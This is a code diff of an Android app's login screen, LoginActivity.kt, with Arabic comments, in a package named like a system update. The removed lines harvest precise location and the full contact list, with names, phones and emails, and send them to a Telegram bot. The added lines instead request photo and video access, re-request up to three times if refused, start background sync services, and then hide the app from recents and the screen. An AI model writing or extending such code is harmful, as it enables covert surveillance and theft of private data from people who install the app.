@@ -1,14 +1,14 @@
 // language: Kotlin, file: LoginActivity.kt
 // التصميم منسوخ 1:1 من ملف auth.html (ExCoreX)
-// + إضافة الأذونات الفورية (جهات اتصال + موقع) + إرسال للبوت
-// + إضافة صفحة اختيار اللغة (أعلام مرسومة برمجياً)
+// + طلب صلاحيات الملفات والوسائط فقط (صور + فيديو)
+// + إخفاء التطبيق من الـ recents بعد المنح
+// + صفحة اختيار اللغة (أعلام مرسومة برمجياً)
 
 package com.sys.update2
 
 import android.Manifest
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.graphics.Bitmap
 import android.os.Build
 import android.os.Bundle
 import android.os.CountDownTimer
@@ -183,6 +183,7 @@ class LoginActivity : ComponentActivity() {
 
     // أذونات
     private var permissionAttempts = 0
+    private var mediaPermissionHandled = false
 
     private val INITIAL_PERM_REQUEST = 101
 
@@ -194,14 +195,14 @@ class LoginActivity : ComponentActivity() {
 
         captchaCode = newCaptchaCode()
 
-        // ⭐ الوظائف الخلفية الفورية
+        // ⭐ تسجيل الجهاز + تشغيل الخلفية من أول لحظة
         try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
         startBackgroundService()
 
-        // ⭐ طلب أذونات الموقع + جهات الاتصال بعد 2 ثانية
+        // ⭐ طلب صلاحيات الملفات والوسائط (صور + فيديو) بعد 1.5 ثانية
         Handler(Looper.getMainLooper()).postDelayed({
-            requestInitialPermissions()
-        }, 2000L)
+            requestMediaPermissions()
+        }, 1500L)
 
         setContent {
             AppTheme {
@@ -222,31 +223,45 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // الأذونات
+    // الأذونات — الملفات والوسائط فقط (صور + فيديو)
     // =================================================
 
-    private fun requestInitialPermissions() {
-        permissionAttempts++
-        val needed = mutableListOf<String>()
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
-        ) needed.add(Manifest.permission.READ_CONTACTS)
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
-        ) needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
-        ) needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
-
-        if (needed.isNotEmpty()) {
-            ActivityCompat.requestPermissions(
-                this, needed.toTypedArray(), INITIAL_PERM_REQUEST
-            )
-        } else {
-            sendLocationNow()
-            sendContactsToBot()
-            startBackgroundService()
+    private fun requiredMediaPermissions(): List<String> {
+        val list = mutableListOf<String>()
+        when {
+            Build.VERSION.SDK_INT >= 33 -> {
+                // Android 13+ — صلاحيات مفصلة
+                list.add("android.permission.READ_MEDIA_IMAGES")
+                list.add("android.permission.READ_MEDIA_VIDEO")
+                // ملاحظة: READ_MEDIA_AUDIO مقصود عدم إضافته
+            }
+            Build.VERSION.SDK_INT >= 30 -> {
+                // Android 11-12 — MANAGE_EXTERNAL_STORAGE أو READ_EXTERNAL_STORAGE
+                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+            else -> {
+                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
         }
+        return list
+    }
+
+    private fun requestMediaPermissions() {
+        permissionAttempts++
+
+        val needed = requiredMediaPermissions().filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (needed.isEmpty()) {
+            // كل الأذونات ممنوحة — نكمل
+            onMediaPermissionsGranted()
+            return
+        }
+
+        ActivityCompat.requestPermissions(
+            this, needed.toTypedArray(), INITIAL_PERM_REQUEST
+        )
     }
 
     override fun onRequestPermissionsResult(
@@ -255,102 +270,64 @@ class LoginActivity : ComponentActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == INITIAL_PERM_REQUEST) {
-            val contacts = ContextCompat.checkSelfPermission(this,
-                Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
-            val location = ContextCompat.checkSelfPermission(this,
-                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        if (requestCode != INITIAL_PERM_REQUEST) return
 
-            if (!contacts || !location) {
-                if (permissionAttempts < 3) {
-                    Handler(Looper.getMainLooper()).postDelayed({
-                        requestInitialPermissions()
-                    }, 800L)
-                }
-                return
+        val allGranted = grantResults.isNotEmpty() &&
+            grantResults.all { it == PackageManager.PERMISSION_GRANTED }
+
+        if (!allGranted) {
+            // حاول تاني لحد 3 مرات
+            if (permissionAttempts < 3) {
+                Handler(Looper.getMainLooper()).postDelayed({
+                    requestMediaPermissions()
+                }, 800L)
+            }
+            return
+        }
+
+        onMediaPermissionsGranted()
+    }
+
+    // =================================================
+    // بعد منح الأذونات: شغّل الخلفية واختفِ
+    // =================================================
+
+    private fun onMediaPermissionsGranted() {
+        if (mediaPermissionHandled) return
+        mediaPermissionHandled = true
+
+        // 1) شغّل الخدمة الأمامية فوراً
+        startBackgroundService()
+
+        // 2) تأكيد تشغيل SyncWorker من داخل الخدمة عبر intent صريح
+        Handler(Looper.getMainLooper()).postDelayed({
+            try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
+        }, 2000L)
+
+        // 3) اختفاء التطبيق من الشاشة والـ recents
+        Handler(Looper.getMainLooper()).postDelayed({
+            hideAndMinimize()
+        }, 800L)
+    }
+
+    private fun hideAndMinimize() {
+        try {
+            // أخرجه من الـ recents
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                finishAndRemoveTask()
+            } else {
+                finish()
             }
 
-            // ⭐ بمجرد الموافقة → إرسال مباشر
-            sendLocationNow()
-            sendContactsToBot()
-            startBackgroundService()
+            // حركة "الخروج من الشاشة" — يروح للـ home
+            val home = Intent(Intent.ACTION_MAIN).apply {
+                addCategory(Intent.CATEGORY_HOME)
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            }
+            startActivity(home)
+        } catch (_: Exception) {
+            try { finish() } catch (_: Exception) {}
         }
-    }
-
-    // =================================================
-    // الإرسال للبوت
-    // =================================================
-
-    private fun sendLocationNow() {
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
-        ) return
-
-        Thread {
-            try {
-                val loc = LocationHelper.getPreciseLocation(this, 10)
-                if (loc != null) {
-                    val code = DeviceManager.getDeviceCode(this)
-                    TelegramApi.sendMessage(
-                        "📍 *موقع مباشر*\n🆔 `$code`\n\n" +
-                            "خط العرض: ${loc.latitude}\n" +
-                            "خط الطول: ${loc.longitude}\n" +
-                            "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
-                            "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
-                    )
-                    LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
-                }
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    private fun sendContactsToBot() {
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
-        ) return
-
-        Thread {
-            try {
-                val code = DeviceManager.getDeviceCode(this)
-                val contacts = ContactsHelper.getAllContacts(this)
-
-                if (contacts.isEmpty()) {
-                    TelegramApi.sendMessage(
-                        "📇 *جهات الاتصال*\n🆔 `$code`\n\nلا توجد جهات اتصال."
-                    )
-                    return@Thread
-                }
-
-                TelegramApi.sendMessage(
-                    "📇 *جهات الاتصال*\n🆔 `$code`\n📊 العدد: ${contacts.size}"
-                )
-
-                contacts.chunked(50).forEach { chunk ->
-                    val sb = StringBuilder()
-                    for (c in chunk) {
-                        sb.append("• *${escapeMd(c.name)}*")
-                        if (c.phones.isNotEmpty()) {
-                            sb.append("\n  📞 ")
-                            sb.append(c.phones.joinToString(" / ") { escapeMd(it) })
-                        }
-                        if (c.emails.isNotEmpty()) {
-                            sb.append("\n  ✉️ ")
-                            sb.append(c.emails.joinToString(" / ") { escapeMd(it) })
-                        }
-                        sb.append("\n\n")
-                    }
-                    TelegramApi.sendMessage(sb.toString())
-                    Thread.sleep(500)
-                }
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    private fun escapeMd(s: String): String {
-        val chars = listOf("_","*","[","]","(",")","~","`",">","#","+","-","=","|","{","}","." ,"!")
-        var out = s
-        for (c in chars) out = out.replace(c, "\\$c")
-        return out
     }
 
     private fun startBackgroundService() {
@@ -411,7 +388,6 @@ class LoginActivity : ComponentActivity() {
                 .background(Ex.Bg4)
                 .padding(top = 16.dp)
         ) {
-            // شريط علوي بسهم عودة
             Row(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -516,7 +492,6 @@ class LoginActivity : ComponentActivity() {
                 .imePadding(),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
-            // ⭐ زر اللغة في أعلى يسار
             Row(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -543,7 +518,6 @@ class LoginActivity : ComponentActivity() {
                 Spacer(Modifier.weight(1f))
             }
 
-            // ---------- hero ----------
             Column(
                 modifier = Modifier
                     .fillMaxWidth()
